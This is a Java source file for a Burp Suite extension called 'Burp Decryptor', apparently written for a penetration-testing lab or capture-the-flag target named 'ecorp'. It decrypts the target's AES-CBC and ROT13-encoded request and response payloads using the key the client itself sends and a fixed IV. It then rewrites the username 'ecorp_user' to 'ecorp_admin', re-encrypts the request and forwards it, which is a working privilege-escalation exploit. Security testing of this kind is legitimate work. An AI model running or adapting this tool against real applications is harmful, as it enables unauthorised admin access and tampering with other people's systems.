import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.*;
import burp.api.montoya.logging.Logging;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.proxy.http.*;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.scope.Scope;
import burp.api.montoya.utilities.Base64Utils;
import burp.api.montoya.utilities.URLUtils;
import burp.api.montoya.utilities.Utilities;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements BurpExtension, HttpHandler {

    private MontoyaApi api;
    private static final String FIXED_IV = "0000000000000000"; // 16-byte IV
    private Logging logging;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
        api.extension().setName("Burp Decryptor");

        // Register the HTTP request handler
        api.http().registerHttpHandler(this);
        logging.logToOutput("Extension Loaded Successfully");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        String requestBody = requestToBeSent.body().toString();

        // Extract MAC (AES key) and data (encrypted payload)
        Pattern macPattern = Pattern.compile("mac=([^&]+)");
        Pattern dataPattern = Pattern.compile("data=([^&]+)");

        Matcher macMatcher = macPattern.matcher(requestBody);
        Matcher dataMatcher = dataPattern.matcher(requestBody);

        if (macMatcher.find() && dataMatcher.find()) {
            try {
                byte[] aesKey = Base64.getDecoder().decode(URLDecoder.decode(macMatcher.group(1), StandardCharsets.UTF_8));
                byte[] encryptedData = Base64.getDecoder().decode(URLDecoder.decode(dataMatcher.group(1), StandardCharsets.UTF_8));

                // Decrypt AES-CBC encrypted data
                byte[] decryptedBytes = decryptAES(encryptedData, aesKey);
                String decryptedData = new String(decryptedBytes, StandardCharsets.UTF_8).trim();

                // First ROT13 pass: param names get scrambled, values get decoded
                String rot13Decoded = rot13(decryptedData);

                // Log fully decoded request (second pass fixes param names)
                String finalDecryptedData = doubleDecodeParameterNames(rot13Decoded);
                logging.logToOutput("\n===== [Decrypted Request] =====");
                logging.logToOutput(finalDecryptedData);
                logging.logToOutput("========================================\n");

                // Modify: replace ecorp_user with ecorp_admin and re-encrypt
                // Depending on endpoint, the username value may appear in plain or ROT13 form here.
                String modifiedRot13 = rot13Decoded
                    .replace("ecorp_user", "ecorp_admin")
                    .replace("rpbec_hfre", "rpbec_nqzva");

                if (!modifiedRot13.equals(rot13Decoded)) {
                    // Second ROT13 pass re-encodes values and restores param names for encryption
                    String toEncrypt = rot13(modifiedRot13);

                    byte[] reEncryptedData = encryptAES(toEncrypt.getBytes(StandardCharsets.UTF_8), aesKey);
                    String newDataEncoded = URLEncoder.encode(
                        Base64.getEncoder().encodeToString(reEncryptedData), StandardCharsets.UTF_8);

                    String newBody = requestBody.replaceFirst("data=[^&]*", "data=" + newDataEncoded);
                    logging.logToOutput("[Modified Request] Replaced ecorp_user with ecorp_admin");
                    return RequestToBeSentAction.continueWith(requestToBeSent.withBody(newBody));
                }

            } catch (Exception e) {
                logging.logToError("Request decryption failed: " + e.getMessage());
            }
        }

        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        String responseBody = responseReceived.body().toString();

        // Extract encrypted result parameter from the response body
        String encryptedResult = extractFormParameter(responseBody, "result");
        if (encryptedResult != null) {
            try {
                // Retrieve the AES key from the initiating request (mac=...)
                String requestBody = responseReceived.initiatingRequest().body().toString();
                String encodedMac = extractFormParameter(requestBody, "mac");
                if (encodedMac == null) {
                    logging.logToError("Could not retrieve AES key from request.");
                    return ResponseReceivedAction.continueWith(responseReceived);
                }

                byte[] aesKey = decodeBase64UrlParam(encodedMac);

                // Decode and decrypt response
                byte[] encryptedResponse = decodeBase64UrlParam(encryptedResult);
                byte[] decryptedResponseBytes = decryptAES(encryptedResponse, aesKey);
                String decryptedResponse = new String(decryptedResponseBytes, StandardCharsets.UTF_8).trim();

                // Apply ROT13 decoding
                String finalDecryptedResponse = rot13(decryptedResponse);

                // Log fully decoded response
                logging.logToOutput("\n===== [Decrypted Response] =====");
                logging.logToOutput(finalDecryptedResponse);
                logging.logToOutput("========================================\n");

            } catch (Exception e) {
                logging.logToError("Response decryption failed: " + e.getMessage());
            }
        }

        return ResponseReceivedAction.continueWith(responseReceived);
    }

    private String extractFormParameter(String body, String parameterName) {
        Pattern pattern = Pattern.compile(parameterName + "=([^&]+)");
        Matcher matcher = pattern.matcher(body);
        return matcher.find() ? matcher.group(1) : null;
    }

    private byte[] decodeBase64UrlParam(String value) {
        return Base64.getDecoder().decode(URLDecoder.decode(value, StandardCharsets.UTF_8));
    }

    private byte[] decryptAES(byte[] encryptedData, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");

        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return cipher.doFinal(encryptedData);
    }

    private byte[] encryptAES(byte[] data, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");

        cipher.init(Cipher.ENCRYPT_MODE, secretKey, iv);
        return cipher.doFinal(data);
    }

    private String rot13(String text) {
        StringBuilder result = new StringBuilder();
        for (char c : text.toCharArray()) {
            if (Character.isLetter(c)) {
                if (Character.isUpperCase(c)) {
                    result.append((char) ('A' + (c - 'A' + 13) % 26));
                } else {
                    result.append((char) ('a' + (c - 'a' + 13) % 26));
                }
            } else {
                result.append(c);
            }
        }
        return result.toString();
    }

    private String doubleDecodeParameterNames(String decodedText) {
        StringBuilder finalDecoded = new StringBuilder();
        String[] params = decodedText.split("&");

        for (String param : params) {
            String[] keyValue = param.split("=", 2);
            if (keyValue.length == 2) {
                String doubleDecodedKey = rot13(keyValue[0]);
                finalDecoded.append(doubleDecodedKey).append("=").append(keyValue[1]).append("&");
            } else {
                finalDecoded.append(param).append("&");
            }
        }

        return finalDecoded.length() > 0 ? finalDecoded.substring(0, finalDecoded.length() - 1) : finalDecoded.toString();
    }
}